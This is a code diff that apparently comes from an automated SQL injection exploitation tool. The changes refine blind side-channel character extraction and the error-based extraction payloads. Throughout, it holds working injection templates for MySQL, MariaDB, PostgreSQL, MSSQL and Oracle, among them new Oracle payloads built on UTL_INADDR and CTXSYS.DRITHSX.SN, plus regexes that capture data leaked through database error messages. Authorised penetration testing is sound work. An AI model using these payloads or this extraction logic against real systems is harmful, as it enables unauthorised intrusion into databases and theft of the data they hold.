+            # (_hval == self._err_hdr_val) which breaks when Content-Length varies
+            # as the SQL condition string length changes during binary search.
+            # Fix: use nearest-neighbor distance (same as length signal) so the
+            # header value anchors to whichever calibration point it's closer to.
             _fp_hdrs = getattr(fp, "headers", {}) or {}
             if hasattr(self, "_diff_hdr") and self._diff_hdr:
                 _hval = _fp_hdrs.get(self._diff_hdr)
-                if _hval is not None and hasattr(self, "_err_hdr_val"):
+                if _hval is not None and hasattr(self, "_err_hdr_val") and hasattr(self, "_ok_hdr_val"):
+                    try:
+                        _hval_i = int(_hval)
+                        _err_i  = int(self._err_hdr_val)
+                        _ok_i   = int(self._ok_hdr_val)
+                        return abs(_hval_i - _err_i) < abs(_hval_i - _ok_i)
+                    except (TypeError, ValueError):
+                        # Non-numeric header: fall back to exact equality
+                        return _hval == self._err_hdr_val
+                elif _hval is not None and hasattr(self, "_err_hdr_val"):
+                    # _ok_hdr_val unavailable: fall back to exact equality
                     return _hval == self._err_hdr_val
             # Fallback: if statuses differ, use those
             if self._err_status != self._ok_status:
@@ -133438,8 +133600,14 @@ class SideChannelExtractor:
                 _above_z = await self.eval_where_error(
                     f"{column}>={self._quote_val(prefix + chr(ord('z') + 1))}")
                 await asyncio.sleep(0.2)
-                if _above_z is None or not _above_z:
-                    lo, hi = ord('a'), ord('z')
+                # BUG-SCE-TCCEIL-2 FIX: was `_above_z is None or not _above_z` which
+                # collapsed a failed oracle probe (None) into the same narrow [97,122]
+                # range as a confirmed False, causing any char above 'z' to silently
+                # extract as 'z'. Fix: match the three-way branch in extract_where_error.
+                if _above_z is None:
+                    lo, hi = ord('a'), _sce_tc_char_hi  # probe failed; keep full upper range
+                elif not _above_z:
+                    lo, hi = ord('a'), ord('z')          # confirmed lowercase a–z
                 else:
                     lo, hi = ord('z') + 1, _sce_tc_char_hi  # BUG-SCE-TCCEIL-FIX: was 255
             elif _above_a is False:
@@ -164733,8 +164901,12 @@ class ErrorBasedExtractor:
     CAST_TEMPLATES = {
         "MySQL": [
             "AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({expr}),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
-            "AND EXTRACTVALUE(1,CONCAT(0x7e,({expr})))",
-            "AND UPDATEXML(1,CONCAT(0x7e,({expr})),1)",
+            # BUG-MYSQL-EXTRACTVALUE-SENTINEL FIX: Added closing 0x7e so the value is
+            # cleanly delimited between two tildes in the XPATH syntax error message.
+            # Without the closing tilde, the LEAK_PATTERNS regex could over-capture
+            # trailing SQL tokens that appear in the error text.
+            "AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))",
+            "AND UPDATEXML(1,CONCAT(0x7e,({expr}),0x7e),1)",
         ],
         # FIX-R10-MARIADB: MariaDB uses identical MySQL error-based functions.
         # _NormalizingDBMSDict normalises "MariaDB"→"MySQL" for DBMS_QUERIES lookups, but
@@ -164742,8 +164914,8 @@ class ErrorBasedExtractor:
         # removes ambiguity and ensures MariaDB probes are logged with the correct DBMS label.
         "MariaDB": [
             "AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({expr}),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
-            "AND EXTRACTVALUE(1,CONCAT(0x7e,({expr})))",
-            "AND UPDATEXML(1,CONCAT(0x7e,({expr})),1)",
+            "AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))",
+            "AND UPDATEXML(1,CONCAT(0x7e,({expr}),0x7e),1)",
         ],
         "PostgreSQL": [
             "AND 1=CAST(({expr}) AS INTEGER)",
@@ -164762,25 +164934,28 @@ class ErrorBasedExtractor:
             "AND 1=(SELECT TOP 1 CONVERT(INT,ISNULL(CAST(({expr}) AS NVARCHAR(MAX)),'NULL')) FROM sys.objects)",
         ],
         "Oracle": [
-            # FIX-R10-ORACLE: Replaced privilege-requiring templates.
-            # UTL_INADDR.GET_HOST_ADDRESS requires EXECUTE on UTL_INADDR (rarely granted to
-            # app-level accounts). CTXSYS.DRITHSX.SN requires the TEXT cartridge installed.
-            # Both silently return NULL / ORA-29257 "host unknown" when denied, leaking nothing.
-            # Replacements:
-            #   TO_NUMBER(expr) — converts any string to number, emits
-            #     ORA-01722: invalid number with the value visible in some drivers
-            #   XMLTYPE(expr) — available to PUBLIC, emits ORA-31011 / ORA-19202 on non-XML
-            #     with the offending value in the Oracle error stack
-            #   1/DECODE(LENGTH(expr),0,1,0) — division-by-zero only when expr is non-empty;
-            #     the expr result appears in some ORA-01476 / ORA-00604 error messages
-            # BUG-ORACLE-CAST-TEMPLATE FIX (Req 10): Removed invalid
-            # "CAST(({expr}) AS INTEGER FROM DUAL)" — "FROM DUAL" cannot appear inside
-            # a CAST() expression in Oracle SQL; it caused ORA-00907 "missing right
-            # parenthesis" on every attempt, silently aborting extraction without any
-            # data leak.  Replaced with a valid DECODE-based division-by-zero trigger.
-            "AND 1=TO_NUMBER(({expr}))",
+            # BUG-ORACLE-ERROR-EXTRACT FIX: The previous templates (TO_NUMBER, XMLTYPE,
+            # DECODE division-by-zero) raise ORA-01722/ORA-01476/ORA-31011 but do NOT
+            # embed the extracted value in the Oracle error message text. The LEAK_PATTERNS
+            # regexes therefore never matched, causing Oracle error-based extraction to
+            # silently return None for every Oracle target.
+            #
+            # Fix 1: UTL_INADDR.GET_HOST_ADDRESS(expr) raises ORA-29257:
+            #   "ORA-29257: host (VALUE) unknown" — the value IS embedded.
+            #   Requires EXECUTE on UTL_INADDR (granted to PUBLIC in Oracle 11g+).
+            #   In older/restricted environments this raises ORA-06598 (insufficient privilege)
+            #   and is skipped by the try_extract() loop.
+            #
+            # Fix 2: CTXSYS.DRITHSX.SN(USER,expr) — embeds value in ORA-20000 message.
+            #   Requires Oracle Text cartridge (CTXSYS schema) which is present by default
+            #   on full Oracle Database installs. Skipped on Express Edition.
+            #
+            # Fix 3: Fallback — keep XMLTYPE as a detection-oracle probe even though it
+            #   does not reliably embed the value in the standard error message. Useful for
+            #   confirming injection exists when UTL_INADDR and CTXSYS are both unavailable.
+            "AND 1=UTL_INADDR.GET_HOST_ADDRESS(({expr}))",
+            "AND CTXSYS.DRITHSX.SN(USER,(SELECT ({expr}) FROM DUAL))=1",
             "AND XMLTYPE(({expr})) IS NOT NULL",
-            "AND 1/DECODE(LENGTH(({expr})),0,1,0)=1",
         ],
         "SQLite": [
             # BUG-SQLITE-ERREXT-NOLEAK FIX: The previous templates triggered
@@ -164827,13 +165002,16 @@ class ErrorBasedExtractor:
         r"invalid input syntax for (?:type )?integer:\s*([^\s\"']+)",
         r"Conversion failed when converting.*?'([^']+)'",
         r"ORA-\d+:.*?'([^']+)'",
-        # FIX-R10-ORACLE: TO_NUMBER raises ORA-01722 "invalid number" — value appears unquoted
-        # after the colon in some Oracle JDBC / cx_Oracle driver messages.
+        # BUG-ORACLE-ERROR-EXTRACT FIX: UTL_INADDR.GET_HOST_ADDRESS raises ORA-29257
+        # "host (VALUE) unknown" — the extracted value IS embedded in the message.
+        # Pattern captures the value between the parentheses.
+        r"ORA-29257:\s*host\s+(?:unknown\s+)?\(([^)]{1,500})\)",
+        r"ORA-29257:[^\(]*\(([^)]{1,500})\)",
+        # CTXSYS.DRITHSX.SN raises ORA-20000 with the value embedded in the message.
+        r"ORA-20000:.*?([A-Za-z0-9_@.$#\-]{2,200})",
+        # ORA-01722 "invalid number" — value appears unquoted in some Oracle JDBC/cx_Oracle
         r"ORA-01722.*?invalid number[:\s]+([^\s\n\"']+)",
-        # FIX-R10-ORACLE: XMLTYPE raises ORA-19202 / ORA-31011; the string content
-        # sometimes appears in the message as: "LPX-00701: error at line 1 column 1" with
-        # the offending XML-prefix of the value showing in the full stack.  Capture the
-        # error-code line that contains the leaked string fragment.
+        # XMLTYPE raises ORA-19202 / ORA-31011; some driver versions include the value
         r"ORA-(?:19202|31011).*?\"([^\"]+)\"",
         r"SQLSTATE\[\w+\].*?'([^']+)'",
         # NOTE: SQLite division-by-zero error messages ("division by zero",
